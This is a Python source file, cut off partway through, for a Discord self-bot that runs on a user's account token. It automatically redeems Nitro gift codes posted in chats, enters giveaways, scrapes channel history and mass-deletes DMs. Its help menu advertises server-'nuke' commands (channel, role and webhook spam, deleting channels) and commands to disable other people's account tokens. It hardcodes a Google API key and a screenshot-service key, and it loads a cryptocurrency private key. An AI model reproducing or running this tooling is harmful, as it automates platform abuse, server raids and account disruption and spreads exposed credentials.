import os, sys
os.system("pip install discord.py-self")
import aiofiles
from keep_alive import keep_alive
import math
import requests, hashlib, socket, sys, wavelink, art, threading, io, base64, qrcode, re, json, time, colorama, datetime, traceback, qrcode, io,random, sys, urllib.parse , asyncio, aiohttp, discord, pytz
from discord.ext import commands, tasks
from colorama import Fore
from dhooks import Webhook, Webhook
from html import escape
#import mobile_status
import inspect
#from datetime import datetime
colorama.init()
#from dateutil import parser
import dateutil.parser as parser 
##########################################################
def load_config(config_file_path):
    with open(config_file_path, 'r') as config_file:
        config = json.load(config_file)
    return config

def save_voice_channel(guild_id, channel_id):
    data = {}
    if os.path.exists(voice_file_path):
        with open(voice_file_path, "r") as f:
            data = json.load(f)
    data[str(guild_id)] = channel_id
    with open(voice_file_path, "w") as f:
        json.dump(data, f, indent=4)

def load_voice_channel(guild_id):
    if os.path.exists(voice_file_path):
        with open(voice_file_path, "r") as f:
            data = json.load(f)
            return data.get(str(guild_id))
    return None

if __name__ == "__main__":
    config_file_path = "config.json"
    config = load_config(config_file_path)
User_Id = config.get("User_Id")
SERVER_Link = config.get("SERVER_Link")
token = config.get("token")
token = config.get("token")
bot_name = config.get("bot_name")
webhookk = config.get("webhook")
fuckoff = Webhook(f"{webhookk}")
prefix = config.get("prefix")
api_token = config.get("BLOCKCYPHER_API_TOKEN")
ltc_addy = config.get("LTC_ADDRESS") 
ltc_priv_key = config.get("LTC_PRIVATE_KEY") 
upi_addy = config.get("UPI_ID")
license_key = config.get("license_key")
tknc= config.get("non_nito_alt")
##########################################################
responses_file = 'autorespo.json'
#################################################
start_time = time.time()
statuses = []
current_status = 0
afk_users = {}
afk_reason = None
delete_bot_messages = False
giveawaysniping = "off"
streamurl = "https://www.twitch.tv/nocopyrightsounds"
nitrosniping = "off"
deleted_messages = {}
auto_responses = {}
vc = {}  
channel_id = None  
voice_file_path = "voice.json"
#################################################
#DiscordWebSocket.identify = identify
bot = commands.Bot(command_prefix=prefix, self_bot=True)
bot.remove_command('help')

async def check_permissions(ctx, member: discord.Member):
    if not ctx.author.guild_permissions.move_members:
        await ctx.send(f"I don't have permissions to move members.")
        return False
    return True

@bot.event
async def on_ready():
    os.system('cls' if os.name == 'nt' else 'clear')    
    print(f"""{Fore.RESET}
{Fore.CYAN}Logged In User's Account{Fore.RESET}
{Fore.YELLOW}Username: {bot.user.name}{Fore.RESET}
{Fore.YELLOW}ID: {bot.user.id}{Fore.RESET}
""")
    try:
        host = "lava-v4.ajieblogs.eu.org"
        port = 443
        password = "https://dsc.gg/ajidevserver"
        https = True 
        uri = f"https://{host}:{port}" if https else f"http://{host}:{port}"
        nodes = [wavelink.Node(uri=uri, password=password)]
        await wavelink.Pool.connect(nodes=nodes, client=bot, cache_capacity=100)
        print("connected to wavelink")
    except Exception as e:
        print(f"Failed to connect to Wavelink: {e}")
    for guild in bot.guilds:
        saved_channel_id = load_voice_channel(guild.id)
        if saved_channel_id:
            channel = bot.get_channel(saved_channel_id)
            if isinstance(channel, discord.VoiceChannel):
                try:
                    vc[guild.id] = await channel.connect()
                    print(f"Reconnected to the voice channel: {channel.name} in guild: {guild.name}")
                except discord.DiscordException as e:
                    print(f"Error connecting to {channel.name} in guild {guild.name}: {e}")

@bot.event
async def on_message(message):
    global delete_bot_messages
    global nitrosniping
    global giveawaysniping
    for trigger, response in auto_responses.items():
        if trigger.lower() in message.content.lower():
            await message.channel.send(response)
            break
    try:
        if nitrosniping == "on":
            try:
                if 'discord.gift' in message.content: 
                    nitrotext = open("Log/nitrolog.txt","a") 
                    code = re.search("discord.gift/(.*)", message.content).group(1)

                    try:
                        nitrotext.write(f"[!] Nitro Found! // Server: {message.guild.name} // Channel: {message.channel.name} // Sent By: {message.author.name}#{message.author.discriminator}\n")
                    except:
                        nitrotext.write(f"[!] Nitro Found! Sent By: {message.author.name}#{message.author.discriminator}\n")
                    if len(code) == 24 or len(code) == 16:
                        result = requests.post('https://discordapp.com/api/v6/entitlements/gift-codes/'+code+'/redeem', json={"channel_id":str(message.channel.id)}, headers={'authorization':token.strip()}).text
                        code = re.search("discord.gift/(.*)", message.content).group(1)

                        if 'this gift has been redeemed already.' in result.lower():
                            nitrotext.write(f"[-] discord.gift/{code} Has already been claimed\n")
                        elif 'nitro' in result.lower():
                            nitrotext.write(f"[+] discord.gift/{code} WAS SNIPED!!!\n")
                        elif 'unknown gift code' in result.lower():
                            nitrotext.write(f"[-] discord.gift/{code} Was an invalid code\n")
                    else:
                        nitrotext.write(f"[-] discord.gift/{code} Was a fake code\n") 
                    nitrotext.close()
            except:
                pass
        if giveawaysniping == "on":
            try:
                if 'giveaway' in str(message.content).lower():
                    if message.author.id == 294882584201003009  or message.author.id == 673918978178940951 or message.author.id == 716967712844414996 or message.author.id == 582537632991543307 or message.author.id == 450017151323996173 or message.author.id == 574812330760863744:
                        await asyncio.sleep(8)
                        await message.add_reaction("🎉")
                        gwlog = open("Log/gwlog.txt","a") 
                        try:
                            gwlog.write(f"[!] Giveaway Entered! // Server: {message.guild.name} // Channel: {message.channel.name} // Bot: {message.author.name}#{message.author.discriminator} \n")
                        except:
                            gwlog.write(f"[+] Giveaway Entered : Server/Channel Not writable because of characters used :| //  Bot: {message.author.name}#{message.author.discriminator} \n[+] Message: {message.content}\n")
            except:
                pass
            if f'<@{bot.user.id}>' in str(message.content): #
                if message.author.id == 294882584201003009 or message.author.id == 673918978178940951 or message.author.id == 716967712844414996 or message.author.id == 582537632991543307 or message.author.id == 450017151323996173 or message.author.id == 574812330760863744:
                    gwlog = open("Log/gwlog.txt","a")
                    try:
                        gwlog.write(f"[+] Giveaway Won: {message.guild.name} // Channel: {message.channel.name} //  Bot: {message.author.name}#{message.author.discriminator}\n[+] Message: {message.content}\n")
                    except:
                        gwlog.write(f"[+] Giveaway Won: Server/Channel Not writable because of characters used :| //  Bot: {message.author.name}#{message.author.discriminator}\n[+] Message: {message.content}\n")

        if delete_bot_messages and message.author.bot:
            await asyncio.sleep(5)
            await message.delete()
        if not message.author.bot:
            if isinstance(message.channel, discord.DMChannel):
                if afk_reason is not None and message.author != bot.user:
                    reply_message = f"> <a:sleep:1305994923559878867> <@{bot.user.id}> is AFK\n> <:arrow_downright:1305994883202416742>Reason `:` {afk_reason}."
                    await message.author.send(reply_message)
                    await fuckoff.send(f"<@{message.author.id}> sent a msg when you were afk")
            else:
                if bot.user in message.mentions:
                    async for msg in message.channel.history(limit=5):
                        if msg.author == bot.user and msg.content.startswith(f"> <a:sleep:1305994923559878867> <@{bot.user.id}> is AFK"):
                            return 
                    if afk_reason is not None:
                        reply_message = f"> <a:sleep:1305994923559878867> <@{bot.user.id}> is AFK\n> <:arrow_downright:1305994883202416742>Reason `:` {afk_reason}."
                        await message.channel.send(reply_message)
                        await fuckoff.send(f"{message.author.mention} sent a msg when you were afk")
    except discord.Forbidden:
        pass
    except discord.HTTPException as e:
        pass                  
    await bot.process_commands(message)

@bot.command(aliases=["h"])
async def help(ctx, helpcategory="none"):
    await ctx.message.delete()  
    helpcategory = helpcategory.lower().replace("[", "").replace("]", "")
    eheh = bot.commands
    fuk = len(eheh)
    fukidk = fuk + 20
    if helpcategory == "none":
        description = f"""
> # **__{bot_name}__**
> 
> Usage :- Type `{prefix}help [category]` for information on its commands
> Command Count : `{fukidk} cmds`
>   
> Categories:
>     <:settings:1306221127126880256> System
>     <:Zeta_utility:1306221128221458463> Utility
>     <:stolen_emoji_blaze:1306312036845883394> Emoji
>     <:HeadMod:1306221130654154796> Moderation
>     <:MOD:1308128124172500992> Security
>     <:msg:1306221132327948358> Snipe
>     <:thunder2:1305942208632983573> Nuke
>     <:fun:1306312785243930655> Fun
>     :underage: Nsfw
>     <:ticket:1306307577038110750> Text
>     :envelope_with_arrow: Vouch
>     <:Members:1305993106457497612> Auto Responder
>     <:Crypto_Exchange:1306307580687028345> Crypto
>     <:copy:1305898732084269106> Guild
>     <:check:1305951941423009803> Checker
>     <:LTC:1305994660073963530> LTC Sender
>     <:prices:1305942191629271120> Selling
>     <:Lr_simp_dot:1307938031067598868> Status
>     <:humanity_VC:1307940060989231154> VC
>     <:43565member:1306361082922799114> Usercmds
>     <:music:1309894376440332403> music
>     <a:7492symbollattice:1310977804925407293> autosender
> 
> __***Made by server.py***__
"""
    elif "system" in helpcategory:
        description = f"""
> # **<:settings:1306221127126880256> {bot_name} System Cmds**
> 
> `{prefix}help`
> `{prefix}ping`
> `{prefix}restart`
> `{prefix}shutdown`
> `{prefix}allcmds`
"""

    elif "utility" in helpcategory:
        description = f"""
> # **<:Zeta_utility:1306221128221458463> {bot_name} Utility Cmds**
> 
> `{prefix}afk [message]`
> `{prefix}unafk`
> `{prefix}`instainfo [username]
> `{prefix}deletemessagesafter [on/off]`
> `{prefix}nicknamecycle`
> `{prefix}userinfo [user]`
> `{prefix}serverinfo`
> `{prefix}uptime`
> `{prefix}avatar`
> `{prefix}downloadavatar`
> `{prefix}purge [amount]`
> `{prefix}purgeuser @user`
> `{prefix}dmclear`
> `{prefix}colorinfo [hex-color]`
> `{prefix}bitcoin`
> `{prefix}hypesquad [bravery/brilliance/balance]`
> `{prefix}idtoname [id]`
> `{prefix}idinfo [id]`
> `{prefix}invite`
> `{prefix}ip [ip-to-locate]`
> `{prefix}leave [server-id]`
> `{prefix}nickscan`
> `{prefix}adminscan`
> `{prefix}scrape`
> `{prefix}massleave`
> `{prefix}serverlist`
> `{prefix}firstmsg`
> `{prefix}screenshot`
> `{prefix}getpic`
"""

    elif "emoji" in helpcategory:
        description = f"""
**<:stolen_emoji_blaze:1306312036845883394> {bot_name} Emoji Cmds**
> 
> `{prefix}addemoji [emoji]`
> `{prefix}bigemoji [emoji]`
> `{prefix}downloadguildemojis [guild-id]`
> `{prefix}stealguildemoji [guild-id]`
"""    

    elif "moderation" in helpcategory or "mod" in helpcategory:
        description = f"""
> # **<:HeadMod:1306221130654154796> {bot_name} Moderation Cmds**
> 
> `{prefix}kick [user]`
> `{prefix}ban [user]`
> `{prefix}banid [user-id]`
> `{prefix}unban [user-id]`
> `{prefix}clearcontent [amount,content]`
> `{prefix}nuke`
"""    

    elif "snipe" in helpcategory:
        description = f"""
> # **<:msg:1306221132327948358> {bot_name} Snipe Cmds**
> 
> `{prefix}snipe`
> `{prefix}nitrosnipe [on/off]`
> `{prefix}giveawaysnipe [on/off]`
"""   
    elif "nuke" in helpcategory:
        description = f"""
> # **<:thunder2:1305942208632983573> {bot_name} Nuke Cmds**
> 
> `{prefix}prune [days]`
> `{prefix}channelspam [amount,name]`
> `{prefix}deletechannels`
> `{prefix}rolespam [amount,name]`
> `{prefix}deleteroles`
> `{prefix}emojinuke`
> `{prefix}webhookspam`
> `{prefix}stopwebhookspam`
> `{prefix}webhookdelete [webhook]`
> `{prefix}tokeninfo [token]`
> `{prefix}tokendisable [token]`
> `{prefix}fucktoken [token]`
"""   

    elif "fun" in helpcategory:
        description = f"""
> # **<:fun:1306312785243930655> {bot_name} Fun Cmds**
> 
> `{prefix}ascii [word]`
> `{prefix}name [name]`
> `{prefix}nitro`
> `{prefix}impersonate [user] [message]`
> `{prefix}www [user]`
> `{prefix}stickbug [user]`
> `{prefix}tweet [user] [message]`
> `{prefix}blurpify [user]`
> `{prefix}magic [user]`
> `{prefix}deepfry [user]`
> `{prefix}captcha [user]`
> `{prefix}threat [user]`
> `{prefix}iphone [user]`
> `{prefix}ship [user]`
> `{prefix}kannagen [text]`
> `{prefix}encrypt [message]`
> `{prefix}decrypt [message]`
> `{prefix}tokenhalf [user]`
> `{prefix}vcspam [vc-id-one] [vc-id-two] [user-id] [amount]`
> `{prefix}spampin [amount]`
> `{prefix}spamreact [amount] [reaction]`
> `{prefix}spamedit [amount] [new-message]`
> `{prefix}spam [amount] [message]`
> `{prefix}qr [message]`
"""   
    elif "vouch" in helpcategory:
            description = f"""
> `{prefix}vouch [product-name & price]`
"""
    elif "crypto" in helpcategory:
        description = f"""
> # **<:Crypto_Exchange:1306307580687028345> {bot_name} Crypto Cmds**
> `{prefix}i2c <amount>`: Convert from I to C.
> `{prefix}c2i <amount>`: Convert from C to I.
> `{prefix}c2c <from> <to> <amount>`: Convert from one cryptocurrency to another (C to C).
> `{prefix}check <crypto>`: Check the status of a specific cryptocurrency.
> `{prefix}price <crypto>`: Get the current price of a specified cryptocurrency.
> `{prefix}convertcrypto <from> <to> <amount>`: Convert between different cryptocurrencies.
"""            
    elif "text" in helpcategory:
        description = f"""
> # **<:ticket:1300853179927363599> {bot_name} Text Cmds**
> 
> `{prefix}block [text]`
> `{prefix}redtext [text]`
> `{prefix}orangetext [text]`
> `{prefix}yellowtext [text]`
> `{prefix}lightgreentext [text]`
> `{prefix}greentext [text]`
> `{prefix}cyantext [text]`
> `{prefix}bluetext [text]`
> `{prefix}bold [text]`
> `{prefix}underline [text]`
> `{prefix}spoiler [text]`
> `{prefix}italic [text]`
> `{prefix}shrug [text]`
> `{prefix}fliptable [text]`
> `{prefix}unfliptable [text]`
> `{prefix}hastebin [text]`
"""
    elif "guild" in helpcategory:
        description = f"""
> # **<:copy:1305898732084269106> {bot_name} Guild Cmds**
> 
> `{prefix}cserver <target-guild> <guild-to-change>` Copy roles, channels
> `{prefix}cchannels <target-guild> <guild-to-change>` Copy channels
> `{prefix}croles <target-guild> <guild-to-change>` Copy Roles
"""
    elif "autorespond" in helpcategory or "autoresponder" in helpcategory:
        description = f"""
> # **<:Members:1305993106457497612> {bot_name} Auto Responder Cmds**
> 
> `{prefix}setar <trigger-word> <reply-msg>`
> `{prefix}removear <trigger-word>`
> `{prefix}showar`
"""
    elif "ltcsender" in helpcategory:
        description = f"""
> # **<:LTC:1305994660073963530> {bot_name} LTC Sender Cmds**
> 
> `{prefix}sendltc <addy> <amount-in-usd>$`
> `{prefix}mybal`
> `{prefix}bal`
"""
    elif "checker" in helpcategory:
        description = f"""
> # **<:check:1305951941423009803> {bot_name} Checker Cmds**
> 
> `{prefix}tokeninfo <token>`
> `{prefix}checkpromo <promo-link>`
"""
    elif "selling" in helpcategory:
        description = f"""
> # **<:prices:1305942191629271120> {bot_name} Selling Commands**
> 
> `{prefix}addy`: Gives your LTC addy.
> `{prefix}upi`: Gives your upi address.
> `{prefix}upiqr <amount>`: Receive payments on your UPI.
> `{prefix}ltcqr <amount>`: Receive payments on your LTC.
        """  
    elif "vouch" in helpcategory:
            description = f"""
> # **<:prices:1305942191629271120> {bot_name} Vouch Commands**
> 
> {prefix}done @user <amount> <product>` : Creates a format to vouch you.
"""
    elif "status" in helpcategory:
            description = f"""
> # **<:Lr_simp_dot:1307938031067598868> {bot_name} Status Commands**
> 
> `{prefix}status [emoji, statusmsg]`
> `{prefix}setmobile`
> `{prefix}watch [status]`
> `{prefix}listen [status]`
> `{prefix}game [status]`
> `{prefix}stream [status]`
> `{prefix}twitchurl [twitch-url for stream status]`
""" 
    elif "vc" in helpcategory:
            description = f"""
> # **<:humanity_VC:1307940060989231154> {bot_name} VC Commands**
> 
> `{prefix}vcmute` - Mutes a user in the current voice channel, preventing them from speaking.
> `{prefix}vcunmute` - Unmutes a user in the current voice channel, allowing them to speak again.
> `{prefix}vcdeafen` - Deafens a user in the current voice channel, preventing them from hearing others.
> `{prefix}vcundeafen` - Undeafens a user in the current voice channel, allowing them to hear others again.
> `{prefix}vc247 [on/off]` - Keeps your id 24/7 in vc
> `{prefix}vckick [user]` - Kicks a user from the current voice channel.
> `{prefix}vcmoveall` - Moves all users in the current voice channel to a specified channel.
> `{prefix}vcmove [user] [channel]` - Moves a specified user from the current voice channel to another channel.
> `{prefix}vcjoin [voice-channel]` - Makes you join the vc.
> `{prefix}vcleave` - Makes you leave the vc.
> `{prefix}vcclear` - Kicks all members from the current voice channel.
> `{prefix}vcsetlimit [limit]` [voice-channel]- Sets a user limit on the voice channel
> `{prefix}vcname [new_name]` - Renames the current voice channel to a new name.
"""                    
    elif "usercmds" in helpcategory:
            description = f"""
> # **<:43565member:1306361082922799114> {bot_name} User Commands**
> `{prefix}delfriends` - remove all friends
> `{prefix}closealldms` - close all dms
> `{prefix}clearpendings` - clear all pending req
> `{prefix}leaveall` - leaves all server
> `{prefix}leaveallgroups` - leave all groups
"""   
    elif "nsfw" in helpcategory:
            description = f"""
> # **:underage: {bot_name} Nsfw Commands**
> `{prefix}anal` - returns anal pics
> `{prefix}erofeet` - returns erofeet pics
> `{prefix}feet` - returns sexy feet pics
> `{prefix}hentai` - returns hentai pics
> `{prefix}boobs` - returns booby pics
> `{prefix}tits` - returns titty pics
> `{prefix}blowjob` - returns blowjob pics
> `{prefix}neko` - returns neko pics
> `{prefix}lesbian` - returns lesbian pics
> `{prefix}cumslut` - returns cumslut pics
> `{prefix}pussy` - returns pussy pics
> `{prefix}waifu` - returns waifu pics
> `{prefix}ass` - returns ass pics
> `{prefix}hwallpaper` - returns hwallpaper pics
> `{prefix}spank` - returns spank pics
> `{prefix}lesbian` - returns lesbian pics
> `{prefix}feet` - returns feet pics
> `{prefix}blowjob` - returns blowjob pics
> `{prefix}ahegao` - returns ahegao pics
> `{prefix}cumm` - returns cumm pics
> `{prefix}hass` - returns hass pics
> `{prefix}hrandom` - returns hrandom pics

"""
    elif "security" in helpcategory:
            description = f"""
> # **<:MOD:1308128124172500992> {bot_name} Security Commands**
> `{prefix}lockdown [on/off]`
> `{prefix}kickallbots`
> `{prefix}deleteallwebhooks`
"""
    elif "music" in helpcategory:
            description = f"""
> # **<:music:1309894376440332403> {bot_name} Music Commands**            
> `{prefix}play <song-name>`
> `{prefix}stop`
> `{prefix}skip`
> `{prefix}volume` 
"""       
    elif "autosender" in helpcategory:
            description = f"""
    > # **<a:7492symbollattice:1310977804925407293> {bot_name} Auto Responder Cmds**
    > 
    > `{prefix}startautosender <channel_id> <cooldown_time> <msg>`
    > `{prefix}stopautosender <channel_id>`
    """                                                     
    await ctx.send(description)
    
############################################
#            System Commands               #
############################################

@bot.command()
async def allcmds(ctx):
    await ctx.send(f'{prefix}help system')
    await ctx.send(f'{prefix}help utility')
    await ctx.send(f'{prefix}help moderation')
    await ctx.send(f'{prefix}help snipe')
    await ctx.send(f'{prefix}help nuke')
    await ctx.send(f'{prefix}help fun')
    await ctx.send(f'{prefix}help text')
    await ctx.send(f'{prefix}help vouch')
    await ctx.send(f'{prefix}help crypto')
    await ctx.send(f'{prefix}help guild')
    await ctx.send(f'{prefix}help autorespond')
    await ctx.send(f'{prefix}help checker')
    await ctx.send(f'{prefix}help ltcsender')
    await ctx.send(f'{prefix}help selling')
    await ctx.send(f'{prefix}help status')
    await ctx.send(f'{prefix}help vc')
    await ctx.send(f'{prefix}help security')
    await ctx.send(f'{prefix}help nsfw')
    await ctx.send(f'{prefix}help usercmds')
    await ctx.send(f'{prefix}help music')
    await ctx.send(f'{prefix}help autosender')

@bot.command()
async def ping(ctx):
    latency = round(bot.latency * 1000)
    await ctx.send(f'> Ping : {latency}ms') 

@bot.command()
async def restart(ctx):
    await ctx.send("Restarting the bot...")
    os.execv(sys.executable, ['python'] + sys.argv) 

@bot.command()
async def shutdown(ctx):
    await ctx.send("Shutting down the bot...")
    await bot.close() 

############################################
#            Utility Commands              #
############################################

'''L = instaloader.Instaloader()
@bot.command()
async def instainfo(ctx, username: str):
    await ctx.message.delete()
    try:
        profile = instaloader.Profile.from_username(L.context, username)
        response = (
            "# Instagram Profile Info\n"
            f"> Username: {profile.username}\n"
            f"> Full Name: {profile.full_name}\n"
            f"> Followers: {profile.followers}\n"
            f"> Following: {profile.followees}\n"
            f"> Number of Posts: {profile.mediacount}\n"
            f"> Profile Picture URL: [Click here for link]({profile.profile_pic_url})\n"
            f"> Bio: {profile.biography}\n"
        )   
    except instaloader.exceptions.ProfileNotExistsException:
        response = f"Profile '{username}' does not exist."
    except Exception as e:
        response = f"An error occurred: {str(e)}"
    await ctx.send(response)'''

@bot.command(name='nickscan', aliases=['scan'], brief="Scans for servers where I have nicknames", usage=".nickscan")
async def nickscan(ctx):
    response = "**Here are the servers where I have nicknames set:**\n"
    for guild in ctx.bot.guilds:
        if guild.me.nick:
            response += f"Server ID: {guild.id}, Server Name: {guild.name}, Nickname: {guild.me.nick}\n"
    if response == "**Here are the servers where I have nicknames set:**\n":
        response = "I don't have nicknames set in any server."
    await ctx.send(response, delete_after=30)
    
@bot.command(name='adminscan', brief="Scans for servers where I have admins", usage=".adminscan")
async def adminscan(ctx):
    guilds_with_admin = [f"Server ID: {guild.id}, Server Name: {guild.name}" for guild in ctx.bot.guilds if guild.me.guild_permissions.administrator]

    response = "__Servers where I have admins:__\n\n" + "\n".join(guilds_with_admin)
    await ctx.send(response, delete_after=30)
    
@bot.command(name='scrape', brief="Scrapes msges in a channel", usage=".scrape <no.>")
async def scrape(ctx, num_messages: int):
    messages = []
    async for message in ctx.channel.history(limit=num_messages):
        content = escape(message.content)
        timestamp = message.created_at.strftime('%Y-%m-%d %H:%M:%S')
        messages.append(f'{message.author.name} ({timestamp}): {content}\n')
    file_name = f"scrape_{ctx.message.id}.txt"
    text_content = ''.join(reversed(messages))
    await ctx.send(file=discord.File(file_name), delete_after=30)
    os.remove(file_name)

@bot.command(name='asci', aliases=['ascii'], brief="Generate ASCII art", usage=".asci <text>")
async def ascii(ctx, *, text: str):
    try:
        ascii_art = art.text2art(text)
        await ctx.send(f"\n{ascii_art}\n", delete_after=30)
    except Exception as e:
        await ctx.send(f"⚠️ Error generating ASCII art:\n {str(e)}", delete_after=30)

@bot.command(aliases=['leaveall'])
async def massleave(ctx):
    guild_counter = len(ctx.bot.guilds)
    index = 0
    for guild in ctx.bot.guilds:
        index +=1
        if guild.owner_id == ctx.bot.user.id:
            await ctx.send(f"I'm the owner of {guild.name}, Seems like I can't leave")
            continue
        try:
            await guild.leave()
            await ctx.send(f"[{index}/{guild_counter}] Left {guild.name}")
            await asyncio.sleep(2)
        except Exception as e:
            await ctx.send(f"[{index}/{guild_counter}] Couldn't leave {guild.name} - {e}")

@bot.command(name='serverlist', aliases=['slist', 'listserver'], brief="Shows user server lists", usage=".serverlist <no.>")
async def serverlist(ctx, page_number: int):
    if page_number < 1:
        await ctx.send("Page number must be at least 1.", delete_after=30)
        return
    servers = ctx.bot.guilds
    servers_per_page = 10
    pages = math.ceil(len(servers) / servers_per_page)
    if page_number > pages:
        await ctx.send(f"Page no. is out of range. Please enter a no. between 1 and {pages}.", delete_after=30)
        return
    start = (page_number - 1) * servers_per_page
    end = start + servers_per_page
    server_list = '\n'.join([f'{server.name} ({server.id})' for server in servers[start:end]])
    await ctx.send(f'**~ List {page_number}**\n\n{server_list}\n', delete_after=30)

@bot.command(name='firstmsg', aliases=['firstm'], brief="Shows first message of channel/dm", usage=".firstmsg")
async def firstmsg(ctx):
    message = await ctx.channel.history(limit=1, oldest_first=True).next()
    bot_response = await ctx.send(message.jump_url)
    await asyncio.sleep(30)
    await bot_response.delete()

'''
https://api.screenshotmachine.com?
key=66114d
&url=screenshotmachine.com
&dimension=1024x768
'''
@bot.command(name='screenshot', aliases=['ss'])
async def screenshot(ctx, url):
    kie = '66114d'
    endpoint = 'https://api.screenshotmachine.com'
    params = {
        'key': kie,
        'url': url,
        'dimension': '1024xfull',
        'format': 'png',
        'cacheLimit': '0',
        'timeout': '200'
    }
    try:
        response = requests.get(endpoint, params=params)
        response.raise_for_status()
        with open('idk.png', 'wb') as f:
            f.write(response.content)
            
        await ctx.send(file=discord.File('idk.png'), delete_after=30)
    except requests.exceptions.RequestException as e:
        await ctx.send('- Failed to take SS {}'.format(str(e)), delete_after=3)
    except Exception as e:
        await ctx.send('An error occurred: {}'.format(str(e)))
    finally:
        os.remove('idk.png')    

@bot.command(aliases=['findphoto', 'showphoto'])
async def getpic(ctx, *, query):
    google_api_key = 'AIzaSyDVaNy89jV_K6KP-ks5pdqJR839g3iLbdo'
    search_engine_id = '47f928af66b3d4185'
    url = 'https://www.googleapis.com/customsearch/v1'
    params = {
        'key': google_api_key,
        'cx': search_engine_id,
        'q': query,
        'searchType': 'image',
        'num': 1}
    response = requests.get(url, params=params)
    if response.status_code == 200:
        data = response.json()
        if 'items' in data and len(data['items']) > 0:
            image_url = data['items'][0]['link']
            await ctx.send(image_url, delete_after=30)
        else:
            await ctx.send("Couldn't Find", delete_after=3)
    else:
        await ctx.send("Error Occurred/ Ratelimited", delete_after=6)
                       
@bot.command()
async def colorinfo(ctx, hex_color: str):
    if hex_color.startswith('#'):
        hex_color = hex_color[1:]
    if len(hex_color) == 6:
        await ctx.send(f"Color info for #{hex_color} is valid!")
    else:
        await ctx.send("Invalid hex color format!")

@bot.command()
async def idtoname(ctx, id: int):
    user = bot.get_user(id)
    await ctx.send(user.name if user else "User not found.")

@bot.command()
async def idinfo(ctx, id: int):
    user = bot.get_user(id)
    if user:
        response = f"**User Info for {user}**\n"
        response += f"**ID**: {user.id}\n"
        response += f"**Name**: {user.name}\n"
        response += f"**Discriminator**: {user.discriminator}\n"
        response += f"**Created At**: {user.created_at.strftime('%Y-%m-%d %H:%M:%S')}\n"
        member = ctx.guild.get_member(id)
        if member:
            response += f"**Joined Server**: {member.joined_at.strftime('%Y-%m-%d %H:%M:%S')}\n"
            response += f"**Roles**: {', '.join([role.name for role in member.roles if role.name != '@everyone'])}\n"
        else:
            response += "**Joined Server**: Not a member of this server.\n"
        await ctx.send(response)
    else:
        await ctx.send("User not found.")

@bot.command()
async def userinfo(ctx, user: discord.User = None):
    user = user or ctx.author
    response = f"**User Info for {user}**\n"
    response += f"**ID**: {user.id}\n"
    response += f"**Name**: {user.name}\n"
    response += f"**Created at**: {user.created_at.strftime('%Y-%m-%d %H:%M:%S')}\n"
    await ctx.send(response)

@bot.command()
async def serverinfo(ctx):
    response = f"**Server Info for {ctx.guild.name}**\n"
    response += f"**ID**: {ctx.guild.id}\n"
    response += f"**Region**: {ctx.guild.region}\n"
    response += f"**Member Count**: {ctx.guild.member_count}\n"
    await ctx.send(response)

@bot.command()
async def uptime(ctx):
    current_time = time.time()
    elapsed_time = current_time - start_time
    await ctx.send(f"Uptime: {str(datetime.timedelta(seconds=int(elapsed_time)))}")

@bot.command()
async def avatar(ctx, user: discord.User = None):
    user = user or ctx.author
    await ctx.send(user.avatar.url)

@bot.command()
async def downloadavatar(ctx, user: discord.User = None):
    user = user or ctx.author
    await ctx.send(user.avatar.url)

@bot.command()
async def purge(ctx, amount: int):
    await ctx.channel.purge(limit=amount + 1)
    await ctx.send(f"Deleted {amount} messages.", delete_after=5)

@bot.command()
async def purgeuser(ctx, user: discord.User, amount: int):
    deleted = await ctx.channel.purge(limit=amount, check=lambda m: m.author == user)
    await ctx.send(f"Deleted {len(deleted)} messages from {user.mention}.", delete_after=5)

@bot.command()
async def invite(ctx):
    invite_link = await ctx.channel.create_invite()
    await ctx.send(f"Invite link: {invite_link}")

@bot.command()
async def ip(ctx, ip_address: str):
    response = requests.get(f"https://ipinfo.io/{ip_address}/json")
    data = response.json()
    await ctx.send(f"IP Info: {data}")

@bot.command()
async def afk(ctx, *, reason):
    global afk_reason
    afk_reason = reason
    await ctx.send(f"> <a:sleep:1305994923559878867> AFK set with the reason: {reason}.")

@bot.command()
async def unafk(ctx):
    if ctx.author.id in afk_users:
        os.execv(sys.executable, ['python'] + sys.argv) 
        await ctx.send("**You're no longer AFK**")
    else:
        os.execv(sys.executable, ['python'] + sys.argv) 
        await ctx.send("**You were not AFK**")

@bot.command()
async def leave(ctx, guild_id: int):
    guild = bot.get_guild(guild_id)
    if guild:
        await ctx.send(f"Left the guild: {guild.name}.")
        await guild.leave()
    else:
        await ctx.send("Guild not found or the bot is not a member of that guild.")

@bot.command(aliases=['hypehousechange', 'hypehouse', "hypesquadchange", "changehypesquad", "changehypehouse", "househype"])
async def hypesquad(ctx, squad=None):
    if squad is None:
        options_message = (f"**- Hypesquad Changer**\n"
            f"Options:\n"
            f"`{prefix.strip()}hypesquad bravery`\n"
            f"`{prefix.strip()}hypesquad brilliance`\n"
            f"`{prefix.strip()}hypesquad balance`")
        await ctx.message.edit(content=options_message)
        return
    if squad.lower() in ["bravery", "1"]:
        typeofhouse = 1
    elif squad.lower() in ["brilliance", "2"]:
        typeofhouse = 2
    elif squad.lower() in ["balance", "3"]:
        typeofhouse = 3
    else:
        allhouses = [1, 2, 3]
        typeofhouse = random.choice(allhouses)
    headers = {
        'Authorization': token.strip(),
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
        'Accept': '*/*'
    }
    response = requests.post("https://discord.com/api/v6/hypesquad/online", json={'house_id': typeofhouse}, headers=headers)
    if response.status_code == 204:
        success_message = (
            f"**- Hypesquad Changer**\n"
            f"Hypesquad changed successfully!"
        )
        await ctx.message.edit(content=success_message)
    else:
        error_message = (
            f"**- Hypesquad Changer**\n"
            f"Error - Site responded with status code: `{response.status_code}`\n"
            f"Message: `{response.text}`"
        )
        await ctx.message.edit(content=error_message)
            
@bot.command(aliases=['cleardms', 'dmsclear'])
async def dmclear(ctx):
    users_done = 0
    total_messages = 0
    
    initial_message = (
        " - Message Clearer\n"
        "Clearing all messages with all users"
    )
    msg = await ctx.send(initial_message)
    for channel in bot.private_channels:
        if isinstance(channel, discord.DMChannel):
            async for message in channel.history(limit=9999):
                try:
                    if message.author == bot.user:
                        if message != msg:
                            await message.delete()
                            total_messages += 1
                except Exception as e:
                    print(f"Error deleting message: {e}")

            users_done += 1
            update_message = (
                f" - Message Clearer\n"
                f"Clearing all messages with all users\n"
                f"Users Done: {users_done}\n"
                f"Total Messages Deleted: {total_messages}"
            )
            await msg.edit(content=update_message)  
    final_message = (
        f" - Message Clearer\n"
        f"Clearing all messages with all users\n"
        f"Task completed - Cleared messages with {users_done} Users\n"
